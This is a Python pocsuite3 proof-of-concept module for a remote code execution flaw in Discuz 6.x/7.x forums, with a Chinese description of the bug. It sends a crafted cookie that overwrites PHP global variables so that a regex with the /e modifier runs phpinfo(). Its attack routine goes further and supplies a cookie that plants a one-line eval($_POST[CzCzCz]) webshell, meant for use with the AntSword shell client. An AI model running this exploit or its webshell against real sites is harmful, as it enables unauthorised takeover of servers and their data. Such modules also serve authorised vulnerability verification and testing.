import os, base64
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID = 'SSVID-93726'
    version = '1.0'
    author = ['cz']
    vulDate = '2014-10-25'
    createDate = '2019-11-14'
    updateDate = '2019-11-14'
    references = ['https://www.seebug.org/vuldb/ssvid-93726']
    name = 'Discuz 7.x/6.x 全局变量防御绕过导致RCE'
    appPowerLink = ''
    appName = 'Discuz'
    appVersion = '6.x 7.x'
    vulType = 'Romote Code Execution'
    desc = '''由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。'''
    samples = []
    install_requires = ['']
    pocDesc = '一句话后门在Cookie中，蚁剑连接时需要设置自定义headers'
    testedEnv = ['Ubuntu_18.04-php_5.6.36-Discuz_7.2']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

    def _verify(self):
        result = {}
        
        payload = 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
        headers = {
            'Cookie': payload
        }
        resp = requests.get(self.url, headers=headers)
        try:
            if resp.status_code == 200 and 'phpinfo' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        
        payload = 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'
        headers = {
            'Cookie': payload
        }
        resp = requests.get(self.url, headers=headers)
        try:
            if resp.status_code == 200 and 'phpinfo' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url
                result['ShellInfo']['Content'] = 'CzCzCz'
                result['ShellInfo']['Headers'] = {
                    'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[CzCzCz])%3B;'
                }
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)
    
register_poc(DemoPOC)
